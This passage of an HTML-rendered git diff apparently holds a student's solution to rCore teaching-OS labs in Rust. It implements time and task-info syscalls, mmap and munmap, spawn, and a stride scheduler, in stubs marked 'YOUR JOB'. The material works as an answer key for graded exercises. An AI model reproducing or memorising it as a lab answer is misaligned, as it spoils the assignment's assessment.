class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex c3d15f3..dca8551 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -60,6 +60,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// remove a area</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some((idx, area)) = self</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d216861..8ff9c7b 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -11,9 +11,9 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix deleted">-</span><span class="token line">use address::&#123;StepByOne, VPNRange&#125;;</span><span class="token prefix deleted">-</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, VirtAddr, VirtPageNum, VPNRange&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use address::StepByOne;</span><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::&#123;frame_alloc, FrameTracker, is_mem_sufficient&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use page_table::&#123;translated_byte_buffer, translated_refmut, translated_str, PageTableEntry&#125;;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 8e0a7dd..ba663a1 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -45,8 +45,11 @@ mod process;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use fs::*;</span><span class="token prefix unchanged"> </span><span class="token line">use process::*;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::task::current_task;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 3]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_READ => sys_read(args[0], args[1] as *const u8, args[2]),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_WRITE => sys_write(args[0], args[1] as *const u8, args[2]),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex f7aa9c3..13b9abb 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,14 +1,16 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    loader::get_app_data_by_name,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;is_mem_sufficient, translated_byte_buffer, translated_refmut, translated_str, VirtAddr&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next,</span><span class="token prefix deleted">-</span><span class="token line">        suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: current_task().unwrap().get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: current_task().unwrap().get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(_len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().mmap(start_va, end_va, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().munmap(start_va, end_va)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span></span>@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: fork + exec =/= spawn</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_spawn(_path: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    // spawn a new process based upon _path</span><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _path = translated_str(token, _path);</span><span class="token prefix inserted">+</span><span class="token line">    let data_opt = get_app_data_by_name(_path.as_str());</span><span class="token prefix inserted">+</span><span class="token line">    if data_opt.is_none() &#123;  // invalid file name</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let new_task = current_task.spawn(data_opt.unwrap());</span><span class="token prefix inserted">+</span><span class="token line">    let new_pid = new_task.getpid();</span><span class="token prefix inserted">+</span><span class="token line">    add_task(new_task);</span><span class="token prefix inserted">+</span><span class="token line">    new_pid as isize</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Set task priority.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_set_priority(_prio: isize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if _prio &lt;= 1 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    current_task.set_prio(_prio);</span><span class="token prefix inserted">+</span><span class="token line">    _prio</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644<span class="token coord">--- a/os/src/task/manager.rs</span><span class="token coord">+++ b/os/src/task/manager.rs</span>@@ -19,11 +19,27 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Add process back to ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock>) &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        task.inc_stride();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.ready_queue.push_back(task);</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Take a process out of the ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn fetch(&amp;mut self) -> Option&lt;Arc&lt;TaskControlBlock>> &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        self.ready_queue.pop_front()</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        // self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        let mut min_stride = isize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        let mut best_idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for (idx, tcb) in self.ready_queue.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let stride = tcb.get_stride();</span><span class="token prefix inserted">+</span><span class="token line">            if min_stride > stride &#123;</span><span class="token prefix inserted">+</span><span class="token line">                min_stride = stride;</span><span class="token prefix inserted">+</span><span class="token line">                best_idx = idx;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        if min_stride == isize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            None</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.swap(0, best_idx);</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644<span class="token coord">--- a/os/src/task/processor.rs</span><span class="token coord">+++ b/os/src/task/processor.rs</span>@@ -8,6 +8,7 @@ use super::__switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;fetch_task, TaskStatus&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;TaskContext, TaskControlBlock&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            task_inner.task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if task_inner.time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            // release coming task_inner manually</span><span class="token prefix unchanged"> </span><span class="token line">            drop(task_inner);</span><span class="token prefix unchanged"> </span><span class="token line">            // release coming task TCB manually</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex 1402c31..e60021d 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,9 +1,10 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management &amp; Functions for completely changing TCB</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span><span class="token prefix deleted">-</span><span class="token line">use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::&#123;trap_handler, TrapContext&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span></span>@@ -34,6 +35,86 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">        inner.memory_set.token()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Set the schduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.set_prio(prio);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get the schduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_stride(&amp;self) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.stride</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase the stride by pass</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.inc_stride();</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            